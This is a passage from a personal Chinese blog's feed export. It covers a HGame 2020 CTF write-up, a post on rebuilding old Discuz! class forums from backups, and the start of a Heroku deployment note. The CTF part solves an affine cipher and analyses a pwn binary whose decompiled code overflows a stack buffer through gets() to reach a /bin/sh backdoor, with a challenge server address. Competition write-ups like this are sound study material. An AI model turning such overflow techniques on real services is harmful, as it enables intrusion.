punctuation">(</span>TABLE<span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        cipher <span class="token operator">+=</span> b    <span class="token keyword">else</span><span class="token punctuation">:</span>        ii <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD        cipher <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># A8I5z{xr1A_J7ha_vG_TpH410}</span></code></pre><p>提示了flag以 <code>hgame{</code> 开头，以 <code>}</code> 结尾，很明显能看出来<code>{ } _</code>这三个字符是找不到而直接加到cipher里的。</p><p>容易得到 MOD=62，于是乎思路就是，<strong>利用  <code>hgame</code> 与 <code>A8I5z</code> 的映射关系，把A和B两个参数给求解出来，再把参数i反解出来，最后把flag还原</strong>。</p><p>码代码吧。</p><pre class=" language-python"><code class="language-python">TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> len<span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 62</span>flag <span class="token operator">=</span> <span class="token string">'hgame'</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 求解得到对应的i</span><span class="token comment" spellcheck="true"># h 12</span><span class="token comment" spellcheck="true"># g 11</span><span class="token comment" spellcheck="true"># a 7</span><span class="token comment" spellcheck="true"># m 6</span><span class="token comment" spellcheck="true"># e 18</span>str_encrypt <span class="token operator">=</span> r<span class="token string">'A8I5z{xr1A_J7ha_vG_TpH410}'</span>iis <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>letter<span class="token punctuation">,</span> iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment" spellcheck="true"># 求解得到对应的ii</span><span class="token comment" spellcheck="true"># A 46</span><span class="token comment" spellcheck="true"># 8 33</span><span class="token comment" spellcheck="true"># I 43</span><span class="token comment" spellcheck="true"># 5 30</span><span class="token comment" spellcheck="true"># z 0</span></code></pre><p>得到了字母对应的i和ii，而<strong>i与ii满足关系 <code>(A*i+B) % 62 = ii</code></strong>，从而可以把A、B解出来。</p><p>查了查<strong>模逆运算</strong>，看了看觉得有点麻烦emmm</p><p>猜想A、B不会太大，干脆直接遍历好了。。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> A <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> B <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">46</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">33</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">43</span> <span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Yes: "</span><span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Yes:  13 14</span></code></pre><p>得到A=13，B=14.</p><p>接下来还原flag。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Begin to decrypt...</span>A <span class="token operator">=</span> <span class="token number">13</span>B <span class="token operator">=</span> <span class="token number">14</span>str_encrypt <span class="token operator">=</span> <span class="token string">'xr1AJ7havGTpH410'</span>str_decrypt <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">:</span>    ii <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span>        <span class="token keyword">if</span> temp <span class="token operator">==</span> ii<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            str_decrypt <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypt<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># M4thu5EdiNcRYpt0</span><span class="token comment" spellcheck="true"># So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`.</span></code></pre><p>这里先把<code>_</code>给去掉了，最后再加上。</p><p>于是乎flag就是：</p><p><code>hgame{M4th_u5Ed_iN_cRYpt0}</code></p><blockquote><p>看来果然是数学啊2333，还想看看大佬们怎么用数学方法解出来的。（（</p><p>如题目所言——  </p><blockquote><p>Some basic modular arithmetic…</p></blockquote></blockquote><blockquote><p><em>Reference:</em> 一点关于模逆运算的介绍，后面有空再看看吧（x</p><p><a href="https://blog.csdn.net/lion19930924/article/details/61926019" target="_blank" rel="noopener">https://blog.csdn.net/lion19930924/article/details/61926019</a></p></blockquote><hr><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>nc 47.103.214.163 20000</p><p>IDA分析一波，发现是memcmp比较，<code>backdoor</code>函数里是执行<code>/bin/sh</code>的。</p><p>其中s与v5距离为 -31h-(-ACh)=123，构造payload发了个<code>"0O0o"</code>过去，发现么得。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-ACh]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Bh] [ebp-31h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A0h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A4h] [ebp-8h]</span>  v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xA0u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's 0O0o\\0O0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token string">"0O0o"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">7u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>20200125更新：</strong></p><p>看了官方WP，草（一种植物），好气啊，<code>\x00</code>把字符串识别隔断了。</p><p><img src="/2020/01/23/CTF_Hgame2020/pwn_Hard_AAAAA.png" alt="image-20200125172242766"></p><hr><hr><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a><strong>未完待续</strong></h2><p><em>（可能会咕咕咕</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站</title>
      <link href="/2020/01/09/Idea_RebuildClassWebsite/"/>
      <url>/2020/01/09/Idea_RebuildClassWebsite/</url>
      
        <content type="html"><![CDATA[<p><strong>2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！</strong>  </p><p>哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤</p><p><br><br></p><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。</p></blockquote><p>有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。</p><p>（很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。</p><p>2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 <strong>End of Life</strong>了。↓</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life.jpg" alt="End_of_Life" style="max-width:40%;"><p>那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个<em>免费的</em>云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。</p><p>那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。</p><blockquote><p>N年前先建了10班的班网论坛，<em>（分班后）</em>又建了个8班的班网。    </p></blockquote><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot2.jpg" alt="img" style="max-width:50%;"><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="img" style="max-width:50%;"><p>​    几天之后，果不其然，<strong>Unavailable了</strong>。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life2.jpg" alt="End_of_Life2" style="max-width:43%;"><p>不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。</p><blockquote><p>于是现在就觉得有点遗憾，通过<em>phpMyAdmin</em>其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。</p><p>但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（</p></blockquote><hr><p>最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。</p><h2 id="重建折腾记"><a href="#重建折腾记" class="headerlink" title="重建折腾记"></a>重建折腾记</h2><h3 id="辣鸡服务器配置出了一堆问题"><a href="#辣鸡服务器配置出了一堆问题" class="headerlink" title="辣鸡服务器配置出了一堆问题"></a>辣鸡服务器配置出了一堆问题</h3><p>之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。</p><blockquote><p>下面是一堆废话emmm</p><p><strong>不想看就直接跳过这节吧。</strong></p></blockquote><p>租服务器的时候<em>图省事</em>直接装了<code>PHPStudy</code>，里面集成了<code>LNMP</code>环境，然后网站什么的直接可以在上面配置。</p><p>之前搭了几个测试用的网站，运行都没什么问题，能正常访问。</p><p>然而这次我建了一个新的<code>PHP</code>环境，打开端口，访问的时候居然报<strong>403无权限</strong>，但是其他的网站都没这个问题。</p><p>看到网页上是<code>nginx</code>报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报<strong>500内部服务器错误</strong>了。（我愣住了</p><p>看了一下错误log，发现很多是无权限，还有的找不到文件？？？</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/error_log.png" alt=""></p><p>复制粘贴搜了一下，怀疑是动态链接库的问题，于是<code>ln</code>尝试创建链接，然而不成功。</p><p>然后不想管了，关闭<code>nginx</code>服务，启动<code>apache</code>服务，这回还是<strong>403</strong>，其他的网站就没问题，绝了。</p><p>换回<code>nginx</code>，将配置文件中的<code>user</code>由<code>www</code>更改为<code>root</code>，再试居然好了！看来果然是<strong>权限的问题</strong>，然而我之前好像并没有改过什么配置，也不清楚<code>www</code>用户为啥就没权限了。</p><p><code>root</code>毕竟不太安全吧，于是又改了回去，403了。</p><p>登录服务器看了一下，几个网站目录下就只有新建的这个用户组是<code>root</code>，修改了目录权限，允许others执行，再访问，没问题了。</p><p>但很奇怪啊为啥就不行啊。</p><p>于是又重装了一次<code>nginx</code>，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。</p><p>WAF的问题啊。</p><p>这时候后台改参数也有报无权限的，就很懵逼。</p><p>于是干脆直接<code>reboot</code>好了。</p><p><strong><em>（有句话说得好，重启解决绝大部分问题</em></strong></p><p>进入后台，先关闭<code>nginx</code>，重装WAF，再开启<code>nginx</code>。这回终于没毛病了。（x</p><br><hr><h3 id=""><a href="#" class="headerlink" title=""></a><br></h3><h3 id="重建8班班网"><a href="#重建8班班网" class="headerlink" title="重建8班班网"></a>重建8班班网</h3><p>重建其实类似于搬家，于是看了几篇关于<code>Discuz!</code>搬家的教程，发现距今都有一段历史了。</p><p>去官方论坛找到了最新的<strong>X3.4版本</strong>的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8  </p><p><strong>啊不是！！！</strong></p><p>别想着啥都想装最新的，得先考虑你要<strong>重建/恢复的系统是什么版本</strong>的啊！还要注意<strong>PHP的版本</strong>，以及<strong>语言编码（GBK/UTF8/BIG5/？）</strong>（就因为这个删掉又重建了好几个版本</p><p>论坛的版本可以在你备份的数据库<code>.sql</code>文件头部注释里看到。（这个还是后面重建10班班网时才发现的</p><p>不要像我一样装了发现用不了嘤嘤嘤。</p><ul><li><code>upload</code>文件夹打包传到服务器上，解压，然后访问网站。</li></ul><blockquote><p>草怎么又403了。</p></blockquote><blockquote><p>检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为<code>www</code>，这回能正常访问了。</p></blockquote><ul><li>按照安装流程全新安装<code>Discuz!</code>系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。  </li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot1.png" alt=""></p><ul><li>安装完成，访问主页是默认的界面。（略）</li><li>根据官方的搬家教程，把<code>utility/restore.php</code>文件上传到网站的<code>data/</code>目录下，再把要恢复的数据库整个目录也上传到<code>data/</code>下，然后通过<code>网站域名/data/restore.php</code>访问数据恢复页面。</li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot2.png" alt=""></p><blockquote><p>然而这里我被自己的WAF给拦住了233。</p><p>开了白名单再导入，这时候过了一段时间报<strong>504</strong>了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤  </p><p>重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。</p></blockquote><blockquote><p>搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504…  </p><p>看了一下<code>.sql</code>文件，干脆不用整个工具，直接导入mysql好了啦。  </p><p>虽然期间还报了几个错，但还是导完了呢。</p></blockquote><ul><li><p>访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。</p></li><li><p>用原始的创始人账号登录后台，<strong>更新缓存</strong>。</p><blockquote><p>这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。</p><p>毕竟整个数据库都改回去了嘛。</p><p>至于忘记密码，emmm后面再说。</p></blockquote></li><li><p>再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-17-56-47-58.jpg" style="max-width:40%;"></li><li><p>（如果有的话）<strong>恢复logo、favicon、attachment、avatar、plugin、template等。</strong></p><p>这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-02-23-26-12.png" alt="恢复后的班网" style="max-width:50%;"></li></ul><p>看了看上面的帖子，<em>全是黑历史啊</em>……（黑脸.png</p><p>用户数据都恢复了，理论上能用原来的信息进行登录。</p><p>然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。</p><p><strong>不过能重建了也总比没有要好呀！嘻嘻嘻。</strong></p><p>毕竟这个版本有很多安全漏洞了，<strong>出于安全考虑，这里就不公开了啦</strong>。</p><p><br><br></p><hr><br><h3 id="重建10班班网"><a href="#重建10班班网" class="headerlink" title="重建10班班网"></a>重建10班班网</h3><p>上面说了云平台<code>End of Life</code>的时候没有备份这个数据的。</p><p>但是我找遍了硬盘，终于<strong>翻出了那时候备份的部分数据</strong>。</p><p>有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。  </p><p>首先还是版本的问题。</p><p>本以为<code>X3.2</code>版本已经够老了，没想到这里最后一直回退到了<strong><code>X2</code>版本</strong>（噗</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot3.png" alt="安装过的版本"></p><p><strong><em>鬼懂得我重建了多少次网站emmmm</em></strong></p><ul><li>期间有一次是<strong>PHP版本错了</strong>，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。</li></ul><ul><li>有一次是<strong>MySQL数据库炸了</strong>，装完之后主页都打不开，直接报的<code>database error</code>。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。</li></ul><ul><li>还有一次是<strong>Discuz版本</strong>装的<code>X2.5</code>，本来挺开心的，导完数据更新完缓存，点开帖子就报<code>database error</code>，说找不到某某记录吧。最后版本降到<code>X2</code>终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。</li></ul><ul><li>还有每一次都遇到了<strong><code>.sql</code>导不进数据库</strong>的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了</li></ul><ul><li><p>噢还有那个<strong>创始人密码忘了</strong>的问题。</p><p>查了一下资料，一个方案是尝试登录<code>UC_Center</code>，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录<code>Discuz</code>的管理后台就行了。（这里用的就是这个方案）</p><p>另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。</p></li></ul><hr><p><strong>重建完成之后访问主页。</strong></p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-23-23-25-80.png" alt=""></p><p>草，原来这个是那时候<strong>更新版本前的最后一次备份</strong>emmm</p><p>（看亚子是第四代，最后更新的是第五代了，看了半天才想起来）</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot4.png" alt="10班班网重建"></p><p>找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。</p><p>于是乎最后重建出来的是2013年1月的备份了。</p><p>怎么说好呢，其实问题也不大吧，<strong>真·回忆啊！</strong></p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-01-57-55-85.jpg" style="max-width:50%;"><p>这个版本的安全漏洞更多了，同样就<strong>不公开了，看看就好了啦</strong>。</p><p><br><br></p><p>emmm下面这个是<strong>恢复不了的第五代版本</strong>（真就只有这张图了嘤嘤嘤）。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="第五代班网" style="max-width:50%;"><p><br><br></p><hr><p><br><br></p><h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><ol><li><p>Linux权限管理还是很严格的，这回体验到了，有空再研究研究。</p><br></li><li><p>选对合适的版本，不要总想着用最新的。</p><br></li><li><p>看了<code>Discuz!</code>系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。</p><p>包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。</p><br></li><li><p>去<code>Discuz!</code>官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_plugin.png" alt="部分之前备份的插件"></p><br></li><li><p>其实还找到了以前可能折腾过的各种建站系统233。</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_websystem.png" alt="可能折腾过的各种建站系统"></p><br></li><li><p>然后就想到<strong>纸飞机</strong>了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过</p><br></li><li><p>写这篇blog的时候又去<code>OpenShift</code>看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的<code>Serverless</code>、 <code>CI/CD</code>之类的，现在的<code>Starter plan</code>也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。</p></li></ol><blockquote><p>版本介绍：<a href="https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/" target="_blank" rel="noopener">https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/</a></p><p>产品介绍：<a href="https://www.openshift.com/products/online/" target="_blank" rel="noopener">https://www.openshift.com/products/online/</a></p></blockquote><p>​        <br></p><ol start="8"><li><p>备份是个好习惯，<strong>CTRL+S</strong>也是。</p><br></li><li><p>看了看之前的帖子，发现全都是黑历史……</p><p>然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。</p><p>等我有空再把上面以前发的文章爬下来备份一份23333.</p><br></li><li><p>有问题欢迎来交流哈哈哈。</p></li></ol><p>溜了溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Discuz </tag>
            
            <tag> 班网 </tag>
            
            <tag> 重建 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAA_iCal_Web在线版本部署</title>
      <link href="/2019/12/29/Tech_NUAAiCalWeb_deploy/"/>
      <url>/2019/12/29/Tech_NUAAiCalWeb_deploy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了…</p><p>（其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤  </p></blockquote><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 <code>NUAA_ClassSchedule</code><br>GitHub链接：<a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">click here</a><br><a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_ClassSchedule</a>  </p><p>其中有一个TODO是搭建一个web端，实现在线导出。</p><p>实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。</p><p>然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。</p><p>解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。</p><p>不过web端就有点麻烦了。</p><p>但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。</p><blockquote><p>其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵</p></blockquote><p><strong>不想往下看又想体验<code>NUAA_iCal_Web</code>在线版本的，<a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">点这里</a>访问吧。</strong>   </p><p><br><br></p><hr><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><h3 id="Heroku简介"><a href="#Heroku简介" class="headerlink" title="Heroku简介"></a><em>Heroku</em>简介</h3><p>偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个<code>deploy with heroku</code>之类的图标按钮。点进去看了看，然后再查了查资料。</p><blockquote><p><em>Heroku</em> is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.  </p></blockquote><blockquote><p>Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。</p></blockquote><p>好东西呀！</p><p>发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。  </p><blockquote><p>其实那时候我连wsgi是啥都不知道……  </p></blockquote><p>官网链接：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>具体的定价策略参见<a href="https://www.heroku.com/pricing" target="_blank" 